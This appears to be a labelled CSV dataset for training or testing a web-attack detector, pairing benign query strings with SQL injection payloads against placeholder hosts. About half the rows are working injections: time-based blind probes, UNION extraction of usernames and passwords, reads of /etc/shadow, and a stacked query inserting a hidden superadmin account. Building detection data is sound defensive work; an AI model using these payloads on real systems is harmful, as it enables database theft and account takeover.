payload,label
"GET http://<HOST>/<PATH>?id=1' AND (SELECT * FROM(SELECT(SLEEP(2)))a) AND '1'='1",attack
GET http://<HOST>/<PATH>?driver_id=DRV-772&shift=morning&route=R4,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 3--,attack
POST http://<HOST>/<PATH>?task_id=TSK-3392&status=done&assignee=rio,benign
"GET http://<HOST>/<PATH>?id=1' AND IF(2>1,BENCHMARK(3000000,SHA1(1)),0)--",attack
GET http://<HOST>/<PATH>?subject=physics&topic=optics&quiz=true,benign
GET http://<HOST>/<PATH>?id=1;SELECT UTL_FILE.FOPEN('DIR','passwd','r') FROM dual--,attack
GET http://<HOST>/<PATH>?warehouse=gudang-b&sku=GDG-4421&qty=50,benign
"GET http://<HOST>/<PATH>?id=1' UNION SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,user(),0x3a,database())--",attack
POST http://<HOST>/<PATH>?payment_method=bca&va=8812309921&amount=250000,benign
GET http://<HOST>/<PATH>?id=1 AND (CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)--,attack
GET http://<HOST>/<PATH>?municipality=batu&district=junrejo&village=tlekung,benign
"GET http://<HOST>/<PATH>?id=1' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",attack
GET http://<HOST>/<PATH>?chart_type=bar&metric=revenue&period=ytd,benign
GET http://<HOST>/<PATH>?id=1 AND SUBSTR(@@version,1,1)='5'--,attack
POST http://<HOST>/<PATH>?patient_id=P4421&diagnosis=hypertension&icd=I10,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 1)='admin'--",attack
GET http://<HOST>/<PATH>?parking_zone=C&slot=22&duration=3h,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT 1,load_file('/etc/shadow'),3--,attack
GET http://<HOST>/<PATH>?airport=MLG&terminal=1&gate=A7,benign
"GET http://<HOST>/<PATH>?id=1';DECLARE @v NVARCHAR(255);SET @v=CHAR(100)+CHAR(98)+CHAR(95)+CHAR(110)+CHAR(97)+CHAR(109)+CHAR(101);EXEC(@v)--",attack
GET http://<HOST>/<PATH>?recipe_id=R7721&servings=4&unit=metric,benign
GET http://<HOST>/<PATH>?id=1 AND MAKE_SET(1=1,(SELECT SLEEP(3)))--,attack
POST http://<HOST>/<PATH>?form_id=F8812&field=address&value=Jl+Ijen+No.5,benign
"GET http://<HOST>/<PATH>?id=1' AND 8=8 UNION SELECT NULL,CONCAT(schema_name),NULL FROM information_schema.schemata--",attack
GET http://<HOST>/<PATH>?provider=telkomsel&quota=10gb&validity=30d,benign
GET http://<HOST>/<PATH>?id=1 OR 1=1 UNION SELECT NULL,NULL,version()--,attack
GET http://<HOST>/<PATH>?job_id=JOB-2291&applicant=U8812&stage=interview,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT 1 FROM(SELECT SLEEP(4))a)='1",attack
POST http://<HOST>/<PATH>?geo=id&province=jatim&city=malang&district=blimbing,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,password FROM users--,attack
GET http://<HOST>/<PATH>?room_type=double&floor=3&view=garden,benign
"GET http://<HOST>/<PATH>?id=1';INSERT INTO admin(username,password,role) VALUES('ghost','pw123','superadmin')--",attack
GET http://<HOST>/<PATH>?filter=today&type=transaction&status=pending,benign
GET http://<HOST>/<PATH>?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT SUBSTR(password,1,8) FROM users WHERE username='admin')),1)--,attack
POST http://<HOST>/<PATH>?device_token=fcm_xK9m2p&platform=android&notify=true,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 AND SLEEP(2)--",attack
GET http://<HOST>/<PATH>?election_id=E2024&region=jatim&tps=221,benign
GET http://<HOST>/<PATH>?id=1 AND LPAD(user(),1,1)>'a'--,attack
GET http://<HOST>/<PATH>?ticket_type=vip&concert=coldplay&row=A,benign
"GET http://<HOST>/<PATH>?id=1 UNION SELECT NULL,CONCAT(0x7e,@@global.secure_file_priv,0x7e),NULL--",attack
POST http://<HOST>/<PATH>?chat_id=C9921&message=hello&type=text,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT HEX(database()))>0--,attack
GET http://<HOST>/<PATH>?semester=genap&ipk=3.7&prodi=ti&angkatan=2021,benign
"GET http://<HOST>/<PATH>?id=1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",attack
POST http://<HOST>/<PATH>?stock_code=BBCA&exchange=idx&lot=10,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 WHERE 1=1 AND SLEEP(3))--,attack
GET http://<HOST>/<PATH>?municipality=sidoarjo&zone=industrial&permit=IMB,benign
"GET http://<HOST>/<PATH>?id=1' AND EXPORT_SET(1,CONCAT(0x7e,database()),NULL,NULL,1)--",attack
GET http://<HOST>/<PATH>?poi=masjid-agung&radius=500&category=mosque,benign
GET http://<HOST>/<PATH>?id=1 UNION ALL SELECT NULL,CONCAT(user(),0x7e,@@version,0x7e,database()),NULL--,attack
